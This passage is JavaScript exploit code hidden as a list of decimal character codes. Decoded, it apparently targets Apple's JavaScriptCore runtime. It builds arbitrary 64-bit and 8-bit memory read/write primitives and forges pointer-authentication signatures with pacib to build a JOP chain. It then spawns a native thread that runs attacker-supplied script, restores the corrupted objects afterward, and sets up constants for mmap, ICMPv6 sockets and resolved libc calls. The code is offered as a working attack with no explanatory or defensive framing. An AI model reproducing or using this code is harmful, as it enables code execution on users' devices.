95, 97, 114, 114, 95, 97, 100, 100, 114, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 118, 97, 108, 117, 101, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 118, 97, 108, 117, 101, 32, 32, 32, 61, 32, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 98, 111, 120, 101, 100, 95, 97, 114, 114, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 97, 100, 100, 114, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 118, 97, 108, 117, 101, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 98, 117, 116, 116, 101, 114, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 56, 110, 44, 32, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 98, 117, 116, 116, 101, 114, 41, 59, 10, 10, 32, 32, 32, 32, 47, 47, 32, 115, 101, 116, 117, 112, 32, 114, 119, 54, 52, 32, 112, 114, 105, 109, 10, 32, 32, 32, 32, 108, 101, 116, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 41, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 41, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 114, 119, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 44, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 10, 32, 32, 32, 32, 47, 47, 32, 115, 101, 116, 117, 112, 32, 114, 119, 56, 32, 112, 114, 105, 109, 10, 32, 32, 32, 32, 108, 101, 116, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 41, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 41, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 44, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 115, 105, 103, 110, 105, 110, 103, 95, 99, 116, 120, 32, 32, 32, 32, 32, 32, 32, 61, 32, 48, 120, 52, 57, 49, 49, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 115, 105, 103, 110, 101, 100, 95, 102, 99, 97, 108, 108, 95, 97, 100, 100, 114, 32, 61, 32, 112, 97, 99, 105, 98, 40, 106, 115, 118, 109, 95, 105, 115, 78, 65, 78, 95, 102, 99, 97, 108, 108, 95, 103, 97, 100, 103, 101, 116, 44, 32, 115, 105, 103, 110, 105, 110, 103, 95, 99, 116, 120, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 105, 115, 110, 97, 110, 95, 99, 111, 100, 101, 95, 112, 116, 114, 44, 32, 115, 105, 103, 110, 101, 100, 95, 102, 99, 97, 108, 108, 95, 97, 100, 100, 114, 41, 59, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 114, 114, 97, 121, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 100, 100, 114, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 10, 32, 32, 32, 32, 109, 101, 109, 99, 112, 121, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 44, 32, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 44, 32, 80, 65, 71, 69, 95, 83, 73, 90, 69, 41, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 40, 51, 110, 32, 42, 32, 48, 120, 56, 110, 41, 44, 32, 116, 97, 114, 103, 101, 116, 95, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 40, 53, 110, 32, 42, 32, 48, 120, 56, 110, 41, 44, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 40, 54, 110, 32, 42, 32, 48, 120, 56, 110, 41, 44, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 112, 99, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 40, 55, 110, 32, 42, 32, 48, 120, 56, 110, 41, 44, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 41, 59, 10, 10, 32, 32, 32, 32, 105, 102, 32, 40, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 32, 61, 61, 32, 48, 110, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 115, 105, 103, 110, 97, 116, 117, 114, 101, 32, 61, 32, 109, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 70, 111, 114, 83, 101, 108, 101, 99, 116, 111, 114, 40, 99, 116, 120, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 32, 32, 32, 32, 61, 32, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 87, 105, 116, 104, 77, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 40, 105, 110, 118, 111, 107, 101, 95, 99, 108, 97, 115, 115, 44, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 115, 105, 103, 110, 97, 116, 117, 114, 101, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 40, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 44, 32, 110, 101, 119, 95, 117, 105, 110, 116, 54, 52, 95, 116, 40, 115, 101, 108, 101, 99, 116, 111, 114, 95, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 41, 44, 32, 49, 110, 41, 59, 10, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 40, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 44, 32, 110, 101, 119, 95, 117, 105, 110, 116, 54, 52, 95, 116, 40, 99, 116, 120, 41, 44, 32, 48, 110, 41, 59, 10, 32, 32, 32, 32, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 40, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 44, 32, 110, 101, 119, 95, 117, 105, 110, 116, 54, 52, 95, 116, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 44, 32, 50, 110, 41, 59, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 115, 116, 104, 114, 101, 97, 100, 32, 61, 32, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 40, 110, 115, 116, 104, 114, 101, 97, 100, 95, 99, 108, 97, 115, 115, 41, 59, 10, 32, 32, 32, 32, 105, 110, 105, 116, 87, 105, 116, 104, 84, 97, 114, 103, 101, 116, 95, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 40, 110, 115, 116, 104, 114, 101, 97, 100, 44, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 118, 111, 107, 101, 44, 32, 48, 110, 41, 59, 10, 32, 32, 32, 32, 110, 115, 116, 104, 114, 101, 97, 100, 95, 115, 116, 97, 114, 116, 40, 110, 115, 116, 104, 114, 101, 97, 100, 41, 59, 10, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 116, 104, 114, 101, 97, 100, 95, 104, 97, 110, 100, 108, 101, 34, 32, 58, 32, 110, 115, 116, 104, 114, 101, 97, 100, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 115, 95, 99, 116, 120, 34, 32, 58, 32, 99, 116, 120, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 34, 32, 58, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 34, 32, 58, 32, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 114, 119, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 32, 58, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 32, 58, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 32, 58, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 32, 58, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 44, 10, 32, 32, 32, 32, 125, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 95, 106, 111, 105, 110, 40, 106, 115, 95, 116, 104, 114, 101, 97, 100, 41, 10, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 32, 32, 32, 32, 32, 61, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 34, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 95, 99, 116, 120, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 106, 115, 95, 99, 116, 120, 34, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 32, 61, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 34, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 115, 116, 104, 114, 101, 97, 100, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 116, 104, 114, 101, 97, 100, 95, 104, 97, 110, 100, 108, 101, 34, 93, 59, 10, 10, 32, 32, 32, 32, 47, 47, 32, 119, 97, 105, 116, 32, 117, 110, 116, 105, 108, 32, 116, 104, 101, 32, 116, 104, 114, 101, 97, 100, 32, 105, 115, 32, 102, 105, 110, 105, 115, 104, 101, 100, 32, 97, 110, 100, 32, 114, 101, 108, 101, 97, 115, 101, 32, 105, 116, 10, 32, 32, 32, 32, 119, 104, 105, 108, 101, 32, 40, 116, 114, 117, 101, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 70, 105, 110, 105, 115, 104, 101, 100, 32, 61, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 110, 115, 116, 104, 114, 101, 97, 100, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 115, 70, 105, 110, 105, 115, 104, 101, 100, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 105, 102, 32, 40, 105, 115, 70, 105, 110, 105, 115, 104, 101, 100, 32, 61, 61, 32, 49, 110, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 98, 114, 101, 97, 107, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 111, 98, 106, 101, 99, 116, 95, 114, 101, 108, 101, 97, 115, 101, 40, 110, 115, 116, 104, 114, 101, 97, 100, 41, 59, 10, 10, 32, 32, 32, 32, 47, 47, 32, 114, 101, 118, 101, 114, 116, 32, 114, 119, 54, 52, 32, 112, 114, 105, 109, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 106, 115, 95, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 41, 32, 43, 32, 48, 120, 56, 110, 41, 32, 43, 32, 48, 120, 49, 48, 110, 44, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 114, 119, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 93, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 106, 115, 95, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 41, 32, 43, 32, 48, 120, 56, 110, 41, 32, 43, 32, 48, 120, 49, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 93, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 114, 101, 118, 101, 114, 116, 32, 114, 119, 56, 32, 112, 114, 105, 109, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 106, 115, 95, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 41, 32, 43, 32, 48, 120, 56, 110, 41, 32, 43, 32, 48, 120, 49, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 93, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 106, 115, 95, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 41, 32, 43, 32, 48, 120, 56, 110, 41, 32, 43, 32, 48, 120, 49, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 93, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 114, 101, 108, 101, 97, 115, 101, 32, 106, 115, 32, 99, 111, 110, 116, 101, 120, 116, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 99, 95, 114, 101, 102, 95, 99, 111, 117, 110, 116, 32, 61, 32, 111, 98, 106, 101, 99, 116, 95, 114, 101, 116, 97, 105, 110, 67, 111, 117, 110, 116, 40, 106, 115, 95, 99, 116, 120, 41, 59, 10, 32, 32, 32, 32, 102, 111, 114, 32, 40, 108, 101, 116, 32, 105, 32, 61, 32, 48, 110, 59, 32, 105, 32, 60, 32, 106, 115, 99, 95, 114, 101, 102, 95, 99, 111, 117, 110, 116, 59, 32, 105, 43, 43, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 111, 98, 106, 101, 99, 116, 95, 114, 101, 108, 101, 97, 115, 101, 40, 106, 115, 95, 99, 116, 120, 41, 59, 10, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 47, 47, 32, 114, 101, 108, 101, 97, 115, 101, 32, 116, 97, 114, 103, 101, 116, 32, 106, 115, 32, 115, 99, 114, 105, 112, 116, 10, 32, 32, 32, 32, 67, 70, 82, 101, 108, 101, 97, 115, 101, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 102, 114, 101, 101, 32, 106, 111, 112, 32, 99, 104, 97, 105, 110, 32, 112, 114, 111, 112, 101, 114, 116, 105, 101, 115, 10, 32, 32, 32, 32, 102, 114, 101, 101, 40, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 91, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 34, 93, 41, 59, 10, 125, 10, 108, 101, 116, 32, 82, 84, 76, 68, 95, 68, 69, 70, 65, 85, 76, 84, 32, 61, 32, 48, 120, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 69, 110, 59, 10, 10, 108, 101, 116, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 65, 78, 89, 87, 72, 69, 82, 69, 32, 61, 32, 49, 110, 59, 10, 108, 101, 116, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 70, 73, 88, 69, 68, 32, 61, 32, 48, 110, 59, 10, 108, 101, 116, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 79, 86, 69, 82, 87, 82, 73, 84, 69, 32, 61, 32, 48, 120, 52, 48, 48, 48, 110, 59, 10, 108, 101, 116, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 82, 65, 78, 68, 79, 77, 95, 65, 68, 68, 82, 32, 61, 32, 56, 110, 59, 10, 108, 101, 116, 32, 86, 77, 95, 73, 78, 72, 69, 82, 73, 84, 95, 78, 79, 78, 69, 32, 61, 32, 50, 110, 59, 10, 108, 101, 116, 32, 86, 77, 95, 80, 82, 79, 84, 95, 68, 69, 70, 65, 85, 76, 84, 32, 61, 32, 51, 110, 59, 10, 10, 108, 101, 116, 32, 80, 82, 79, 84, 95, 82, 69, 65, 68, 32, 61, 32, 48, 120, 49, 110, 59, 10, 108, 101, 116, 32, 80, 82, 79, 84, 95, 87, 82, 73, 84, 69, 32, 61, 32, 48, 120, 50, 110, 59, 10, 10, 108, 101, 116, 32, 77, 65, 80, 95, 83, 72, 65, 82, 69, 68, 32, 61, 32, 48, 120, 49, 110, 59, 10, 10, 108, 101, 116, 32, 65, 70, 95, 73, 78, 69, 84, 54, 32, 61, 32, 51, 48, 110, 59, 10, 108, 101, 116, 32, 83, 79, 67, 75, 95, 68, 71, 82, 65, 77, 32, 61, 32, 50, 110, 59, 10, 108, 101, 116, 32, 73, 80, 80, 82, 79, 84, 79, 95, 73, 67, 77, 80, 86, 54, 32, 61, 32, 53, 56, 110, 59, 10, 108, 101, 116, 32, 73, 67, 77, 80, 54, 95, 70, 73, 76, 84, 69, 82, 32, 61, 32, 49, 56, 110, 59, 10, 10, 108, 101, 116, 32, 83, 69, 69, 75, 95, 83, 69, 84, 32, 61, 32, 48, 110, 59, 10, 10, 108, 101, 116, 32, 95, 78, 83, 71, 69, 84, 69, 88, 69, 67, 85, 84, 65, 66, 76, 69, 80, 65, 84, 72, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 95, 78, 83, 71, 101, 116, 69, 120, 101, 99, 117, 116, 97, 98, 108, 101, 80, 97, 116, 104, 34, 41, 59, 10, 108, 101, 116, 32, 65, 67, 67, 69, 83, 83, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 97, 99, 99, 101, 115, 115, 34, 41, 59, 10, 108, 101, 116, 32, 67, 79, 78, 70, 83, 84, 82, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 99, 111, 110, 102, 115, 116, 114, 34, 41, 59, 10, 108, 101, 116, 32, 70, 67, 78, 84, 76, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 99, 110, 116, 108, 34, 41, 59, 10, 108, 101, 116, 32, 70, 83, 